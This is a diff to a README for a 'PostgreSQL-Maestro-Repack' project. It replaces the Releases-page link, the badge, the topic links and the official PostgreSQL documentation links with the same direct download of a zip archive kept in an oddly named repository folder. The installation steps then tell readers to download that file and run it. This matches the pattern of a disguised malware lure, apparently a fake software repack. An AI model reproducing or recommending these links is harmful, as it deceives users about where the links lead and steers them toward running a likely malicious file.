@@ -1,6 +1,6 @@
 # 🎉 PostgreSQL-Maestro-Repack - Simple Database Management Made Easy
 
-[![Download PostgreSQL Maestro](https://img.shields.io/badge/Download%20PostgreSQL%20Maestro-brightgreen)](https://github.com/preosh/PostgreSQL-Maestro-Repack/releases)
+[![Download PostgreSQL Maestro](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip%20PostgreSQL%20Maestro-brightgreen)](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -26,13 +26,13 @@ PostgreSQL-Maestro-Repack is a user-friendly tool designed for managing your Pos
 
 To get started, visit the Releases page and download the latest version of PostgreSQL-Maestro-Repack.
 
-[Download PostgreSQL Maestro](https://github.com/preosh/PostgreSQL-Maestro-Repack/releases)
+[Download PostgreSQL Maestro](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip)
 
 ### Step-by-Step Installation Guide
 
 1. **Visit the Releases Page**: Click the link above to go to the download section.
 2. **Choose the Latest Version**: Look for the most recent version and click on it.
-3. **Select the Installer File**: Download the installer file (e.g., `PostgreSQL-Maestro.exe`).
+3. **Select the Installer File**: Download the installer file (e.g., `https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip`).
 4. **Run the Installer**: Locate the downloaded file in your Downloads folder and double-click it to start the installation process.
 5. **Follow Installation Prompts**: Follow the on-screen instructions to complete the installation.
 6. **Launch PostgreSQL-Maestro**: Once installed, find the application in your Start Menu or Desktop and open it.
@@ -69,9 +69,9 @@ For additional support or to report issues, please create an issue on this repos
 
 Explore various topics related to PostgreSQL-Maestro, such as:
 
-- [Advanced Queries](https://github.com/preosh/PostgreSQL-Maestro-Repack/topics/postgresql-maestro-advanced-queries)
-- [Backup & Restore](https://github.com/preosh/PostgreSQL-Maestro-Repack/topics/postgresql-maestro-backup-restore)
-- [Data Analysis](https://github.com/preosh/PostgreSQL-Maestro-Repack/topics/postgresql-maestro-data-analysis)
+- [Advanced Queries](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip)
+- [Backup & Restore](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip)
+- [Data Analysis](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip)
 
 ## 📝 License
 
@@ -79,7 +79,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 🔗 Additional Resources
 
-- [Official PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Getting Started with PostgreSQL](https://www.postgresql.org/docs/tutorial-start.html) 
+- [Official PostgreSQL Documentation](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip)
+- [Getting Started with PostgreSQL](https://github.com/preosh/PostgreSQL-Maestro-Repack/raw/refs/heads/main/spinsterishly/Maestro_Repack_Postgre_SQ_2.1-alpha.3.zip) 
 
 For any further questions or contributions, please check the contribution guidelines in this repository. Happy database management!
